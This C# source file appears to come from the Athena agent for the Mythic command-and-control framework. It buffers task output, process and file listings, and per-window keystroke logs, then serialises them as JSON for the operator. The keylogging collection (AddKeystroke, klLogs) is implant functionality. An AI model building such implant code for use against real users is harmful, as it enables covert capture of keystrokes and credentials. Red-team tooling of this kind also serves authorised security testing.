using System.Collections.Concurrent;
using System.Diagnostics;
using System.Runtime.CompilerServices;
using System.Text;
using Athena.Models;
using Athena.Models.Mythic.Tasks;
using Athena.Models.Responses;
namespace Athena.Commands
{
    public class TaskResponseHandler
    {
        private static ConcurrentDictionary<string, ResponseResult> responseResults = new ConcurrentDictionary<string, ResponseResult>();
        private static ConcurrentBag<string> responseStrings = new ConcurrentBag<string>();
        private static ConcurrentDictionary<string, ProcessResponseResult> processResults = new ConcurrentDictionary<string, ProcessResponseResult>();
        private static ConcurrentDictionary<string, FileBrowserResponseResult> fileBrowserResults = new ConcurrentDictionary<string, FileBrowserResponseResult>();
        public static ConcurrentDictionary<string, MythicJob> activeJobs = new ConcurrentDictionary<string, MythicJob>();

        public static string klTask = String.Empty;
        public static Dictionary<string, Keylogs> klLogs = new Dictionary<string, Keylogs>();




        public static ConcurrentDictionary<string, StringBuilder> _keylogOutput = new ConcurrentDictionary<string, StringBuilder>();
        public static ConcurrentDictionary<string, Dictionary<string,Keylogs>> keyloggerOutput = new ConcurrentDictionary<string, Dictionary<string,Keylogs>>();
        public static void AddResponse(string res)
        {
            responseStrings.Add(res);
        }
        public static void AddResponse(ResponseResult res)
        {
            if (!responseResults.ContainsKey(res.task_id))
            {
                responseResults.TryAdd(res.task_id, res);

                if (res.completed)
                {
                    activeJobs.TryRemove(res.task_id, out _);
                }

                return;
            }

            ResponseResult newResponse = responseResults[res.task_id];

            if (!newResponse.completed && res.completed)
            {
                newResponse.completed = res.completed;
                activeJobs.TryRemove(res.task_id, out _);
            }

            if (!string.IsNullOrEmpty(res.status))
            {
                newResponse.status = res.status;
            }
        }
        public static void AddResponse(FileBrowserResponseResult res)
        {
            if (!fileBrowserResults.ContainsKey(res.task_id))
            {
                fileBrowserResults.TryAdd(res.task_id, res);

                if (res.completed)
                {
                    activeJobs.TryRemove(res.task_id, out _);
                }

                return;
            }

            FileBrowserResponseResult newResponse = fileBrowserResults[res.task_id];

            if (!newResponse.completed && res.completed)
            {
                newResponse.completed = res.completed;
                activeJobs.TryRemove(res.task_id, out _);
            }

            if (!string.IsNullOrEmpty(res.status))
            {
                newResponse.status = res.status;
            }
        }
        public static void AddResponse(ProcessResponseResult res)
        {
            if (!processResults.ContainsKey(res.task_id))
            {
                processResults.TryAdd(res.task_id, res);
                return;
            }

            ProcessResponseResult newResponse = processResults[res.task_id];
            if (!newResponse.completed && res.completed)
            {
                newResponse.completed = res.completed;
            }

            if (!string.IsNullOrEmpty(res.status))
            {
                newResponse.status = res.status;
            }

            if (res.completed)
            {
                activeJobs.TryRemove(res.task_id, out _);
            }

        }
        public static void Write(string? output, string task_id, bool completed, string status)
        {
            responseResults.AddOrUpdate(task_id, new ResponseResult { user_output = output, completed = completed, status = status, task_id = task_id }, (k, t) =>
            {
                ResponseResult newResponse = t;
                newResponse.user_output += output;
                if (!newResponse.completed && completed)
                {
                    newResponse.completed = true;
                }

                if (!string.IsNullOrEmpty(status))
                {
                    newResponse.status = status;
                }
                return newResponse;
            });

            if (completed)
            {
                activeJobs.TryRemove(task_id, out _);
            }
        }
        public static void Write(string? output, string task_id, bool completed)
        {
            Write(output, task_id, completed, "");
        }
        public static void WriteLine(string? output, string task_id, bool completed, string status)
        {
            responseResults.AddOrUpdate(task_id, new ResponseResult { user_output = output + Environment.NewLine, completed = completed, status = status, task_id = task_id }, (k, t) =>
            {
                var newResponse = (ResponseResult)t;
                newResponse.user_output += output + Environment.NewLine;
                if (!newResponse.completed && completed)
                {
                    newResponse.completed = true;
                }
                if (!string.IsNullOrEmpty(status))
                {
                    newResponse.status = status;
                }
                return newResponse;
            });

            if (completed)
            {
                activeJobs.TryRemove(task_id, out _);
            }
        }
        public static void WriteLine(string? output, string task_id, bool completed)
        {
            WriteLine(output, task_id, completed, "");
        }
        public static async Task<List<string>> GetTaskResponsesAsync()
        {
            List<string> results = new List<string>();
            //responeResults

            foreach(var response in responseResults)
            {
                ResponseResult rr;
                if(responseResults.TryRemove(response.Key, out rr))
                {
                    results.Add(rr.ToJson());
                }
            }

            foreach (var response in processResults)
            {
                ProcessResponseResult pr;
                if (processResults.TryRemove(response.Key, out pr))
                {
                    results.Add(pr.ToJson());
                }
            }

            foreach (var response in fileBrowserResults)
            {
                FileBrowserResponseResult fr;
                if (fileBrowserResults.TryRemove(response.Key, out fr))
                {
                    results.Add(fr.ToJson());
                }
            }

            //responseStrings
            while (!responseStrings.IsEmpty)
            {
                string res;
                if (responseStrings.TryTake(out res))
                {
                    results.Add(res);
                }
            }

            if (!String.IsNullOrEmpty(klTask) && klLogs.Count > 0)
            {
                KeystrokesResponseResult krr = new KeystrokesResponseResult();
                krr.task_id = klTask;
                krr.keylogs = klLogs.Values.ToList();
                krr.Prepare();

                results.Add(krr.ToJson());
                klLogs.Clear();
            }
            return results;
        }
        public static void AddKeystroke(string window_title, string task_id, string key)
        {
            if (String.IsNullOrEmpty(klTask))
            {
                klTask = task_id;
            }

            if (!klLogs.ContainsKey(window_title))
            {
                klLogs.Add(window_title, new Keylogs()
                {
                    window_title = window_title,
                    user = String.Empty,
                    builder = new StringBuilder()
                });
            }

            klLogs[window_title].builder.Append(key);
        }

    }
}